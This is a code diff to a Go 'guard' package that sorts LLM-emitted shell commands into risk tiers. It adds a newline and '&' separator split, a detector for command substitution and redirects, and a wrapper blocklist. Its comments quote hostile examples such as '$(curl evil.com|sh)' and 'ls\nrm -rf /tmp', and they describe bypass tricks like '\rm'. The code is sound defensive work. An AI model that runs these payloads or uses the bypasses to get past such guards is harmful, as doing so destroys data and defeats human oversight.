@@ -1,6 +1,7 @@
 package guard
 
 import (
+	"path/filepath"
 	"strings"
 	"unicode"
 )
@@ -122,7 +123,19 @@ func (s *splitState) toggleQuote(r rune) bool {
 func (s *splitState) inQuotes() bool { return s.inSingle || s.inDouble }
 
 // operatorWidth returns the number of runes that make up a pipeline operator
-// starting at runes[i], or 0 if none. Operators recognised: &&, ||, |, ;.
+// starting at runes[i], or 0 if none.
+//
+// Statement separators recognised:
+//   - "&&" / "||" — chained conditional execution (width 2)
+//   - "|"         — pipe (width 1)
+//   - ";"         — sequential separator (width 1)
+//   - "\n"        — newline as a statement separator: a heredoc / multi-line
+//     payload like "ls\nrm -rf /tmp" must not be treated as a single token,
+//     otherwise the destructive segment is hidden behind the read-only first
+//     command and the classifier returns the lower tier.
+//   - "&"  (single) — backgrounding separator: "ls & rm -rf /tmp" backgrounds
+//     ls and runs rm immediately. Single & is only an operator when NOT part
+//     of "&&" (handled above).
 func operatorWidth(runes []rune, i int) int {
 	r := runes[i]
 	if i+1 < len(runes) {
@@ -134,7 +147,13 @@ func operatorWidth(runes []rune, i int) int {
 			return 2
 		}
 	}
-	if r == '|' || r == ';' {
+	if r == '|' || r == ';' || r == '\n' {
+		return 1
+	}
+	// Single '&' is a separator only when it is NOT part of '&&'. The "&&"
+	// case is handled above (width 2), so any '&' that reaches this branch
+	// is a standalone backgrounding operator.
+	if r == '&' {
 		return 1
 	}
 	return 0
@@ -142,7 +161,22 @@ func operatorWidth(runes []rune, i int) int {
 
 // classifySimple classifies a single simple command (no pipeline operators).
 // It extracts the command name and flags, then looks up tier tables.
+//
+// Order of checks:
+//  1. Shell-special metacharacter detector — process / command substitution,
+//     here-docs, redirects to absolute paths cannot be statically classified
+//     by token-level inspection, so the segment is escalated.
+//  2. Tokenisation + env-var stripping.
+//  3. Wrapper-command blocklist (sudo, bash -c, git bisect run, …) which all
+//     execute arbitrary shell — must classify at T6.
+//  4. cmdName normalisation via filepath.Base so "/bin/rm", "\rm",
+//     "/usr/bin/rm" all map to "rm" before the lookup table.
+//  5. Static lookup / dispatcher.
 func classifySimple(cmd string) (RiskTier, string) {
+	if tier, reason, ok := detectShellSpecial(cmd); ok {
+		return tier, reason
+	}
+
 	tokens := tokenize(cmd)
 	if len(tokens) == 0 {
 		return T7, "empty segment"
@@ -154,7 +188,238 @@ func classifySimple(cmd string) (RiskTier, string) {
 		return T7, "no command after env assignments"
 	}
 
+	// Wrapper blocklist runs BEFORE normalisation because some entries are
+	// multi-token (e.g. "git bisect run", "xargs sh -c") and require the
+	// original token list with its arguments intact.
+	if tier, reason, ok := classifyWrapperBlocklist(tokens, cmdName); ok {
+		return tier, reason
+	}
+
+	// Command name normalisation: strip path prefixes and backslash escapes
+	// so "/bin/rm", "\\rm", "/usr/bin/rm" all map to "rm" for table lookup.
+	cmdName = normalizeCmdName(cmdName)
+
 	return dispatchCommand(cmdName, tokens)
+}
+
+// normalizeCmdName strips path prefixes and a single leading backslash
+// (a common shell-builtin bypass: "\rm" runs the on-disk rm, ignoring any
+// alias or function called rm) so the command resolves to its base name.
+//
+// We deliberately keep the case as-is on case-sensitive filesystems; macOS is
+// case-insensitive in practice but the LLM-emitted commands target the linux
+// dev environment where "RM" is a different binary from "rm". If the operator
+// wants case folding they can extend this helper, but doing so by default
+// would over-flag on Linux.
+func normalizeCmdName(name string) string {
+	name = strings.TrimPrefix(name, "\\")
+	return filepath.Base(name)
+}
+
+// detectShellSpecial scans seg for shell metacharacters that defeat static
+// token-level classification. If found, the segment is escalated to a higher
+// tier and the function returns (tier, reason, true).
+//
+// Patterns checked (outside of quoted regions):
+//   - $(...)            command substitution                → T5
+//   - `...` (backticks) command substitution                → T5
+//   - <(...)            process substitution (input)        → T4
+//   - >(...)            process substitution (output)       → T4
+//   - <<                here-doc                            → T4
+//   - <<<               here-string                         → T4
+//   - >>                append redirect                     → T4
+//   - > /…              redirect to absolute path           → T5
+//   - >> /…             append-redirect to absolute path    → T5
+//
+// Rationale: a segment containing $(curl evil.com|sh) is a deletion vector
+// hidden behind an "echo" prefix that the token-level lookup would classify
+// as T0. Without this detector the classifier silently undercounts risk.
+//
+// detectShellSpecial scans the entire segment and returns the highest tier
+// found across all metacharacter patterns; if multiple patterns are present
+// (e.g. here-string + command substitution), the highest tier wins so we
+// don't shadow the actual destructive primitive behind a lower-risk one.
+//
+//nolint:gocyclo // single sequential scan over runes; switch arms are flat
+func detectShellSpecial(seg string) (RiskTier, string, bool) {
+	var (
+		maxTier   RiskTier
+		maxReason string
+		found     bool
+	)
+	bump := func(t RiskTier, r string) {
+		if !found || t > maxTier {
+			maxTier = t
+			maxReason = r
+			found = true
+		}
+	}
+
+	st := splitState{}
+	runes := []rune(seg)
+	for i := 0; i < len(runes); i++ {
+		r := runes[i]
+		// $() command substitution — must check BEFORE toggleQuote, because
+		// $(...) is expanded inside double quotes (echo "$(curl x|sh)") and
+		// inside backticks. Single quotes DO suppress expansion in real bash,
+		// but we choose to over-flag here: an LLM emitting `'$(...)'` is still
+		// suspicious enough to escalate.
+		if r == '$' && i+1 < len(runes) && runes[i+1] == '(' {
+			bump(T5, "shell-special: $() command substitution")
+			continue
+		}
+		if st.toggleQuote(r) {
+			continue
+		}
+		if st.inQuotes() {
+			continue
+		}
+		// backtick command substitution
+		if r == '`' {
+			bump(T5, "shell-special: backtick command substitution")
+			continue
+		}
+		// <( and >( process substitution
+		if (r == '<' || r == '>') && i+1 < len(runes) && runes[i+1] == '(' {
+			bump(T4, "shell-special: process substitution "+string(r)+"(")
+			continue
+		}
+		// << here-doc / <<< here-string  / >> append-redirect
+		if r == '<' && i+1 < len(runes) && runes[i+1] == '<' {
+			bump(T4, "shell-special: here-doc / here-string")
+			continue
+		}
+		if r == '>' && i+1 < len(runes) && runes[i+1] == '>' {
+			if tier, reason, ok := detectAbsRedirectAt(runes, i+2); ok {
+				bump(tier, reason)
+			} else {
+				bump(T4, "shell-special: append redirect (>>)")
+			}
+			continue
+		}
+		// > /abs/path
+		if r == '>' {
+			if tier, reason, ok := detectAbsRedirectAt(runes, i+1); ok {
+				bump(tier, reason)
+			}
+		}
+	}
+	if !found {
+		return 0, "", false
+	}
+	return maxTier, maxReason, true
+}
+
+// detectAbsRedirectAt reports whether the next non-whitespace rune at runes[start:]
+// begins an absolute path (starts with '/'). When true, the segment is classified
+// as T5 because writing to /etc/cron.d, /etc/sudoers, /etc/hosts is a privilege-
+// escalation primitive the LLM should never emit unattended.
+func detectAbsRedirectAt(runes []rune, start int) (RiskTier, string, bool) {
+	for j := start; j < len(runes); j++ {
+		c := runes[j]
+		if c == ' ' || c == '\t' {
+			continue
+		}
+		if c == '/' {
+			return T5, "shell-special: redirect to absolute path", true
+		}
+		return 0, "", false
+	}
+	return 0, "", false
+}
+
+// classifyWrapperBlocklist matches commands that execute arbitrary shell.
+// Returning T6 because they bypass any per-binary risk classification — the
+// inner payload is the actual risk, but it's user-controlled string content
+// that we cannot statically analyse.
+//
+// Patterns covered:
+//   - "sudo …"                     → T6
+//   - "bash -c …", "sh -c …"       → T6
+//   - "python -c", "python3 -c"    → T6
+//   - "node -e", "deno eval"       → T6
+//   - "eval …", "exec …"           → T6
+//   - "xargs sh -c", "xargs bash -c" → T6
+//   - "git bisect run …"           → T6 (runs arbitrary shell at each commit)
+//   - "git submodule foreach …"    → T6 (runs arbitrary shell in each submodule)
+//   - "git config alias.* !sh"     → T6 (alias prefixed with ! runs shell)
+//   - "git rebase -x …"            → T6 (runs arbitrary shell at each rebase step)
+//   - "git filter-branch …"        → T6 (rewrites history, runs arbitrary shell)
+func classifyWrapperBlocklist(tokens []string, cmdName string) (RiskTier, string, bool) {
+	// Single-token wrappers (cmdName is the wrapper).
+	switch cmdName {
+	case "sudo":
+		return T6, "wrapper: sudo escalates privilege", true
+	case "eval":
+		return T6, "wrapper: eval executes shell string", true
+	case "exec":
+		return T6, "wrapper: exec replaces process with arbitrary command", true
+	}
+
+	// Wrappers that take "-c" / "-e" arg.
+	if (cmdName == "bash" || cmdName == "sh") && hasFlag(tokens, "-c") {
+		return T6, "wrapper: " + cmdName + " -c executes arbitrary shell string", true
+	}
+	if (cmdName == "python" || cmdName == "python3") && hasFlag(tokens, "-c") {
+		return T6, "wrapper: " + cmdName + " -c executes arbitrary python string", true
+	}
+	if cmdName == "node" && hasFlag(tokens, "-e") {
+		return T6, "wrapper: node -e executes arbitrary javascript string", true
+	}
+	if cmdName == "deno" && len(tokens) >= 2 && tokens[1] == "eval" {
+		return T6, "wrapper: deno eval executes arbitrary javascript string", true
+	}
+
+	// xargs sh -c / xargs bash -c
+	if cmdName == "xargs" {
+		for i := 1; i < len(tokens)-1; i++ {
+			if tokens[i] == "sh" || tokens[i] == "bash" {
+				if tokens[i+1] == "-c" {
+					return T6, "wrapper: xargs " + tokens[i] + " -c executes arbitrary shell", true
+				}
+			}
+		}
+	}
+
+	// git subcommand wrappers.
+	if cmdName == "git" && len(tokens) >= 3 {
+		sub := tokens[1]
+		action := tokens[2]
+		switch {
+		case sub == "bisect" && action == "run":
+			return T6, "wrapper: git bisect run executes arbitrary shell at each commit", true
+		case sub == "submodule" && action == "foreach":
+			return T6, "wrapper: git submodule foreach executes arbitrary shell per submodule", true
+		case sub == "rebase" && hasFlag(tokens, "-x"):
+			return T6, "wrapper: git rebase -x executes arbitrary shell at each step", true
+		case sub == "filter-branch":
+			return T6, "wrapper: git filter-branch rewrites history with arbitrary shell", true
+		case sub == "config":
+			// "git config alias.foo '!sh -c …'" — alias starting with '!' is shell.
+			if hasAliasShellEscape(tokens) {
+				return T6, "wrapper: git config alias with '!' shell prefix", true
+			}
+		}
+	}
+
+	return 0, "", false
+}
+
+// hasAliasShellEscape returns true if any token of a `git config` command
+// begins with `alias.` (so the command sets an alias) AND any later token
+// starts with `!`, which makes git invoke the alias body via /bin/sh -c.
+func hasAliasShellEscape(tokens []string) bool {
+	settingAlias := false
+	for _, t := range tokens {
+		if strings.HasPrefix(t, "alias.") {
+			settingAlias = true
+			continue
+		}
+		if settingAlias && strings.HasPrefix(t, "!") {
+			return true
+		}
+	}
+	return false
 }
 
 // firstNonEnvToken returns the first token in tokens that is not an environment
